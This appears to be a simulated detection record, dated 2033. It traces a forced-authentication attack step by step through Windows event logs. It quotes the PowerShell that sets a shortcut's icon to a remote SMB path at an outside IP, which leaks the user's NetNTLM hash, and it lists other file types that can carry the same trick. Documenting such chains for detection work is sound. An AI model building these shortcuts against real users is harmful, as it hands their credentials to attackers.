    {"step": 1, "tactic": "Craft .lnk shortcut with UNC IconLocation pointing at attacker SMB", "technique": "T1187", "what_happened": "At 2033-05-18 13:18:08 UTC on WS-HR-12, AMSI EID 4104 captured a powershell.exe scriptblock invoking 'New-Object -ComObject WScript.Shell' AND calling $lnk.IconLocation = '\\\\185.93.16.221\\share\\favicon.ico,0' + $lnk.TargetPath = 'notepad.exe' + $lnk.Description = 'Quarterly Report'. Sysmon EID 11 confirmed creation of C:\\Users\\l.fontaine\\AppData\\Local\\Temp\\p136_lnk_131808\\corp-document.lnk (1234 bytes).", "chain_reason": "A .lnk file with IconLocation set to a remote UNC path (\\\\<attacker>\\share\\...) is the canonical T1187 'Forced Authentication' primitive. When Windows Explorer enumerates the folder containing this .lnk (any folder browse / Desktop refresh / Open dialog), it AUTOMATICALLY resolves the icon — initiating an SMB connection to the attacker IP and sending NetNTLM authentication."},
    {"step": 2, "tactic": "Stage .lnk in user-traversed folders (Desktop + Downloads)", "technique": "T1187", "what_happened": "At 2033-05-18 13:18:18, Sysmon EID 11 confirmed copy of the .lnk to C:\\Users\\l.fontaine\\Desktop\\p136-test-131808.lnk AND C:\\Users\\l.fontaine\\Downloads\\p136-test-131808.lnk. Both folders are auto-enumerated by Explorer on user session activity. Rule 92201 triggered.", "chain_reason": "Desktop + Downloads are guaranteed-to-be-enumerated locations. The attacker maximizes the chance that the icon-resolution UNC fetch fires when l.fontaine (or any other user on the host) clicks/refreshes those folders."},
    {"step": 3, "tactic": "Outbound TCP 445 to non-corp attacker IP", "technique": "T1187", "what_happened": "At 2033-05-18 13:18:42, Sysmon EID 3 captured outbound TCP from svchost.exe (NetLogon / LanmanWorkstation context) to 185.93.16.221:445 with the SourceImage handle owned by explorer.exe (icon-resolution callback). Rule 92300 triggered.", "chain_reason": "Outbound TCP/445 to a non-corp IP from explorer / svchost LanmanWorkstation chain is the SMB connect for the icon fetch. 185.93.16.221 is a public IP and not in the corp file-server allowlist — there is NO legitimate reason for SMB traffic to this destination."},
    {"step": 4, "tactic": "Security 4624 LogonType=3 outbound to attacker (NetNTLM challenge-response delivered)", "technique": "T1187", "what_happened": "At 2033-05-18 13:18:44, Security EID 4624 on WS-HR-12 logged a LogonType=3 (Network) outbound authentication attempt with NTLM workgroup target — the NetNTLM challenge-response was sent to 185.93.16.221. The hash captured at the attacker side belongs to l.fontaine's domain identity. AMSI EID 4104 also captured the variant pattern list referencing HTML <img>, RTF INCLUDEPICTURE, Word XML, CSS background-url, form action, link rel=icon. Rule 60103 triggered.", "chain_reason": "4624 LogonType=3 NTLM outbound to a non-corp IP is the conclusive evidence that l.fontaine's NetNTLM credential material was sent to the attacker. The hash is now in attacker hands for offline crack OR for relay against corp services (LDAP, ADCS, SMB)."}
